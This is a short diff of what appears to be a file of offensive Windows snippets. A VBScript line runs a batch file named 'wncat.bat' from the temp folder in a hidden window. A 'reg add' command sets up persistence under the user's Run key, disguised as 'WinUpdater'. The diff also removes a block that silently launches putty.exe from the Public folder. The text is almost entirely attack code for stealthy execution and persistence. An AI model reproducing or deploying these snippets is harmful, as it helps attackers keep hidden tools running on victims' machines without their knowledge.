@@ -11,10 +11,6 @@ WinScriptHost.Run Chr(34) & "%TEMP%\wncat.bat" & Chr(34), 0
 Set WinScriptHost = Nothing
 
 ````
-````
-WScript.Sleep(5000):Set objShell = WScript.CreateObject("WScript.Shell"):objShell.Run("start C:\Users\Public\putty.exe"), 0, True
-
-````
 
 ````
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v WinUpdater /t REG_SZ /d "%TEMP%\wncat.vbs"
